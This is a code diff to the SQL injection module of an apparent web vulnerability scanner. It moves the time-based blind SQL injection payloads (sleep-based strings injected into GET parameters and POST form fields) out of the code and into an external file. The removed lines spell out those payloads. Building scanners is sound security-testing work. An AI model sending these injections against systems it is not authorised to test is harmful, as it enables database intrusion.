@@ -30,8 +30,13 @@ class SQLInjectionAttack(Attack):
   """
   This class implements an SQL Injection attack
   """
+
+  CONFIG_FILE = "blindSQLPayloads.txt"
+  blind_sql_payloads = []
+
   def __init__(self,HTTP,xmlRepGenerator):
     Attack.__init__(self,HTTP,xmlRepGenerator)
+    self.blind_sql_payloads = self.loadPayloads(self.CONFIG_DIR+"/"+self.CONFIG_FILE)
 
   def __findPatternInResponse(self,data):
     if data.find("You have an error in your SQL syntax")>=0:
@@ -188,13 +193,9 @@ class SQLInjectionAttack(Attack):
   # first implementations for blind sql injection...
   # must had this to Vulnerability type
   def blindGET(self, page, dict, attackedGET):
-    payloads = ['" and sleep(10)="',
-                "' and sleep(10)='",
-                "1 and sleep(10)#",
-                "sleep(3)#"]
     if dict == {}:
-      for payload in payloads:
-        payload = self.HTTP.quote(payload)
+      for payload in self.blind_sql_payloads:
+        payload = self.HTTP.quote(payload.replace("__TIME__","10"))
         url = page+"?"+payload
         if url not in attackedGET:
           if self.verbose == 2:
@@ -220,8 +221,8 @@ class SQLInjectionAttack(Attack):
     else:
       for k in dict.keys():
         tmp = dict.copy()
-        for payload in payloads:
-          tmp[k] = payload
+        for payload in self.blind_sql_payloads:
+          tmp[k] = payload.replace("__TIME__","10")
           url = page+"?"+self.HTTP.encode(tmp)
           if url not in attackedGET:
             if self.verbose == 2:
@@ -254,16 +255,12 @@ class SQLInjectionAttack(Attack):
             attackedGET.append(url)
 
   def blindPOST(self, form, attackedPOST):
-    payloads = ['" and sleep(10)="',
-                "' and sleep(10)='",
-                "1 and sleep(10)#",
-                "sleep(3)#"]
     page = form[0]
     dict = form[1]
     for k in dict.keys():
       tmp = dict.copy()
-      for payload in payloads:
-        tmp[k] = payload
+      for payload in self.blind_sql_payloads:
+        tmp[k] = payload.replace("__TIME__","10")
         if (page, tmp) not in attackedPOST:
           headers = {"Accept": "text/plain"}
           if self.verbose == 2:
